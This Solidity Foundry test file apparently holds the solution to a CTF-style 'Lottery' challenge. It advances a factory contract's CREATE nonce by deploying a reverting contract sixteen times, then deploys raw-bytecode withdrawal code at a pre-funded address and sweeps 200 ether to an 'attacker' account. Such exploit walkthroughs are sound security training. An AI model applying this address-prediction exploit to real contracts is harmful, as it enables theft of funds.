// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";

contract Factory {
    function dep(bytes memory _code) public payable returns (address x) {
        require(msg.value >= 10 ether);

        assembly {
            x := create(0, add(0x20, _code), mload(_code))
        }
        if (x == address(0)) payable(msg.sender).transfer(msg.value);
    }
}

contract Lottery is Test {
   
    Factory private factory;
    address attacker;

    function setUp() public {
        factory = new Factory();
        attacker = makeAddr("attacker");
    }

	function testLottery() public {
		vm.deal(attacker, 11 ether);
		vm.deal(0x0A1EB1b2d96a175608edEF666c171d351109d8AA, 200 ether);
		vm.startPrank(attacker);

		//Solution
		/*
		   contract Revert {
			   constructor() {
				   revert("");
			   }
		   }
		 */
		bytes memory codeRevert = hex"6080604052348015600f57600080fd5b506040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401604090607c565b60405180910390fd5b600082825260208201905092915050565b50565b600060686000836049565b9150607182605a565b600082019050919050565b60006020820190508181036000830152609381605d565b905091905056fe";
		for (uint i; i<16; i++) {
			factory.dep{value: 10 ether}(codeRevert);
		}

		/*
		   contract Withdraw {
			   constructor(address attacker) {
				   payable(address(attacker)).send(address(this).balance);
			   }
		   }
		 */

		bytes memory codeWithdraw = hex"608060405234801561001057600080fd5b5060405161014b38038061014b833981810160405281019061003291906100d1565b8073ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f1935050505050506100fe565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061009e82610073565b9050919050565b6100ae81610093565b81146100b957600080fd5b50565b6000815190506100cb816100a5565b92915050565b6000602082840312156100e7576100e661006e565b5b60006100f5848285016100bc565b91505092915050565b603f8061010c6000396000f3fe6080604052600080fdfea264697066735822122030479a835daab8373f3069876b1114d02f6fae6f4cb587c49a2cda4f0e483d0264736f6c63430008130033";

		codeWithdraw = abi.encodePacked(codeWithdraw, abi.encode(attacker));
		factory.dep{value: 10 ether}(codeWithdraw);

		vm.stopPrank();
		assertGt(attacker.balance, 200 ether);
	}
}
